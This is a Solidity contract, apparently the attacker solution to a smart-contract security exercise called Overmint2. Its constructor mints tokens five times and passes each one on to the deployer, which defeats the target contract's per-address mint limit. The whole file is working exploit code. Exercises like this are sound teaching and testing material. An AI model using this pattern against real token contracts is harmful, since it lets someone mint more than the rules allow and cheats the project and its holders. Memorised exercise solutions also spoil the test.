// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Overmint2} from "../Overmint2.sol";

contract Overmint2Attacker {
    Overmint2 overmint2;

    constructor(address overmint2_) {
        overmint2 = Overmint2(overmint2_);
        for (uint256 i = 1; i <= 5; i++) {
            overmint2.mint();
            overmint2.transferFrom(address(this), msg.sender, overmint2.totalSupply());
        }
    }
}
